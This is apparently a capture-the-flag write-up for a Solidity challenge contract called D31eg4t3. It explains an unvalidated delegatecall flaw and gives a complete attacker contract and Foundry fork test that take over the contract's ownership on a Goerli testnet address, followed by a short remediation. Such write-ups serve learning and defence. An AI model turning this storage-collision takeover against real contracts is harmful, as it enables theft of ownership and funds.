## D31eg4t3

### Vulnerability Analysis
Given contract utilizes low-lvl functionality - `delegatecall`, which is expected to be used with care.

The issue here is that no validation applied to an external call, so any malicious entity free to exploit the ability of
`delegatecall` to modify state of the calling contract.

### Attack Steps
1. Implement attacker contract with the same storage variables layout as in `D31eg4t3`
   * `attack` function should initiate the attack, by calling `D31eg4t3.hackme` with payload data for calling `updateState` function
   * `updateState` function is expected to be called via `delegatecall` and should update the owner
2. Initiate attack
3. After attack succeeded, the state(owner) of `D31eg4t3` will be updated.

### POC

attacker contract - `D31eg4t3Attack.sol`
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./D31eg4t3.sol";

contract D31eg4t3Attack {
  uint a = 12345;
  uint8 b = 32;
  string private d;
  uint32 private c;
  string private mot;
  address public owner;

  mapping (address => bool) public canYouHackMe;

  D31eg4t3 target;

  constructor(address _target) {
    target = D31eg4t3(_target);
  }

  function attack() external {
    bytes memory data = abi.encodeWithSelector(this.updateState.selector, address(this));
    target.hackMe(data);
  }

  function updateState(address _owner) external {
    owner = _owner;
    canYouHackMe[_owner] = true;
  }
}
```

forge(foundry) test:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./D31eg4t3.sol";
import "./D31eg4t3Attack.sol";

// For this test we will use a forked environment
contract D31eg4t3POC is Test {
  D31eg4t3 target = D31eg4t3(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);
  D31eg4t3Attack attacker = new D31eg4t3Attack(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);

  function setUp() external {
    require(target.owner() != address(attacker), "POC: attacker is owner");
    require(target.canYouHackMe(address(attacker)) == false, "POC: hacked");
  }

  function testExploit() external {
    attacker.attack();

    require(target.owner() == address(attacker), "POC: attacker not owner");
    require(target.canYouHackMe(address(attacker)) == true, "POC: not hacked");
  }
}

```

Command: `forge test --mc D31eg4t3POC -f $GOERLI_RPC_URL`

### Remediation
`delegatecall` should only be used on approved(known) contracts.
